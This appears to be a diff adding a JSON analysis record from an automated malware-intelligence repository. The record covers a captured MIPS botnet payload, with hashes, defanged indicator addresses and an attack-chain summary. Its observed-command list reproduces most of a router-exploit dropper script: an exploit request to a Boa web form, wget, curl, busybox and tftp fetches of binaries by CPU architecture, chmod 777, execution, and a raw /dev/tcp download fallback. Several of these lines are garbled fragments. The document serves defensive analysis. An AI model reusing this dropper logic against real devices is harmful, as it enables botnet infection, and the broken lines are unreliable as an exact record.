@@ -1,0 +1,403 @@
+{
+  "artifact": {
+    "analysis_state": "needs_review",
+    "format": "ELF32 big-endian executable/shared object, machine=MIPS, entry=0x400260",
+    "id": 82064,
+    "md5": "620c007093f64dfe672252c0bd483f25",
+    "sha1": "5e848778ec4fbfddc94b5a76e5a56bf2e5173ce3",
+    "sha256": "cad9e90cb8998664e5b39e7336c2310016f5b29704296a1070d950fa40ea8e41",
+    "size_bytes": 448624,
+    "source_url_defanged": "hxxp://154[.]90[.]70[.]23/mips",
+    "type": "payload"
+  },
+  "attack_chain": [
+    {
+      "description": "Attacker-observed activity referenced a payload URL.",
+      "evidence": "analysis/command_trace.md",
+      "stage": "delivery_reference"
+    },
+    {
+      "description": "Oraculo recovered the payload into quarantine without execution.",
+      "evidence": "metadata/artifact.json",
+      "stage": "safe_fetch"
+    },
+    {
+      "description": "Observed commands may include permission and execution-attempt patterns.",
+      "evidence": "analysis/command_trace.md",
+      "stage": "execution_attempt"
+    },
+    {
+      "description": "Repository stores analysis, metadata, indicators and base64 raw archive.",
+      "evidence": "README.md",
+      "stage": "defensive_publication"
+    }
+  ],
+  "audiences": {
+    "ai_machine_context": "metadata/ai_context.json",
+    "human_learning": "analysis/learning_notes.md",
+    "raw_archive": "raw/README.md",
+    "soc_operations": "analysis/soc_brief.md"
+  },
+  "generated_at_utc": "2026-08-15T18:08:33Z",
+  "important_files": {
+    "command_trace": "analysis/command_trace.md",
+    "human_readable": "analysis/human_readable.md",
+    "iocs": "analysis/iocs.json",
+    "learning_notes": "analysis/learning_notes.md",
+    "overview": "README.md",
+    "raw_manifest": "raw/manifest.json",
+    "soc_brief": "analysis/soc_brief.md",
+    "yara_dir": "yara/"
+  },
+  "iocs": {
+    "domains_defanged": [],
+    "ips": [
+      "119.0.0.0",
+      "120.0.0.0",
+      "154.90.70.23"
+    ],
+    "urls_defanged": [
+      "hxxp://154[.]90[.]70[.]23/mips"
+    ]
+  },
+  "observed_command_steps": [
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "POST /boaform/adminformLogout//boaform/admin/formPing6 HTTP/1[.]1"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "download payload or remote script",
+      "step": "wget -nc hxxp://45[.]87[.]174[.]8/k[.]php?a=mips,99N97OK5FN9K9D75H -O [.]/upnpsetup"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "change working directory",
+      "step": "cd /tmp 2>/dev/null"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "change working directory",
+      "step": "cd /var/tmp 2>/dev/null"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "attempt execution",
+      "step": "cd /dev/shm 2>#!/bin/sh"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "HOST=\"91[.]199[.]133[.]133:8080\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "BIN=/tmp/[.]n"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "/dev/null"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "ARCH=\"\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "CPUINFO=$(cat /proc/cpuinfo 2>/dev/null | head -20)"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "case \"$CPUINFO\" in"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "*mips*el*|*MIPS*el*|*mips*le*) ARCH=\"mipsel\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "*mips*|*MIPS*) ARCH=\"mips\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "*arm*|*ARM*)"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "if echo \"$CPUINFO\" | grep -q \"v7\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "then ARCH=\"armv7l\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "elif echo \"$CPUINFO\" | grep -q \"aarch64\\|armv8\\|arm64\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "then ARCH=\"arm\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "else ARCH=\"arm\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "fi"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "*x86_64*|*amd64*|*AMD64*) ARCH=\"x86_64\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "*i486*|*i586*|*i686*|*Intel*) ARCH=\"x86_64\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "*powerpc*|*ppc*|*PowerPC*) ARCH=\"powerpc\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "*)"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "UNAME=$(uname -m 2>/dev/null)"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "case \"$UNAME\" in"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "mips) ARCH=\"mips\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "mipsel) ARCH=\"mipsel\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "arm*) ARCH=\"arm\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "aarch64) ARCH=\"arm\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "x86_64) ARCH=\"x86_64\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "i*86) ARCH=\"x86_64\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "*) ARCH=\"mips\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "# default fallback"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "esac"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "esac"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "case \"$ARCH\" in"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "armv7l|armv5l|armv4l|arm) REAL_ARCH=\"arm\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "mips) REAL_ARCH=\"mips\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "mipsel) REAL_ARCH=\"mipsel\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "x86_64|i486) REAL_ARCH=\"x86_64\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "powerpc) REAL_ARCH=\"arm\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "# fallback to arm"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "*) REAL_ARCH=\"mips\""
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "download payload or remote script",
+      "step": "(wget hxxp://$HOST/real_$REAL_ARCH -O $BIN 2>/dev/null"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "download payload or remote script",
+      "step": "chmod (curl -s hxxp://$HOST/real_$REAL_ARCH -o $BIN 2>/dev/null"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "download payload or remote script",
+      "step": "chm(busybox wget hxxp://$HOST/real_$REAL_ARCH -O $BIN 2>/dev/null &(tftp -g -r real_$REAL_ARCH $HOST -l $BIN 2>/dev/null"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "change permissions to make file executable",
+      "step": "chmod 7esac"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "777 $BIN"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "$BIN)"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "od 777 $BIN"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "$BIN)"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "change permissions to make file executable",
+      "step": "& chmod 777 $BIN"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "$BIN)"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "77 $BIN"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "$BIN)"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "(exec 3<>/dev/tcp/91[.]199[.]133[.]133/8080 2>/dev/null"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "echo -e \"GET /real_$REAL_ARCH HTTP/1[.]0\\r\\nHost: 91[.]199[.]133[.]133\\r\\n\\r\\n\" >&3"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "(read -r h"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "while read -r l"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "[ -n \"$l\" ]"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "do :"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "done"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "cat) <&3 > $BIN"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "change permissions to make file executable",
+      "step": "chmod 777 $BIN"
+    },
+    {
+      "evidence": "analysis/command_trace.md",
+      "meaning": "observed command fragment",
+      "step": "$BIN)"
+    }
+  ],
+  "raw_archive": {
+    "format": "base64 text",
+    "path": "raw/sample.b64.txt",
+    "raw_bytes_archived": true,
+    "raw_executable_directly_published": false,
+    "sha256_path": "raw/sample.sha256.txt"
+  },
+  "schema": "oraculo.ai_context.v1"
+}
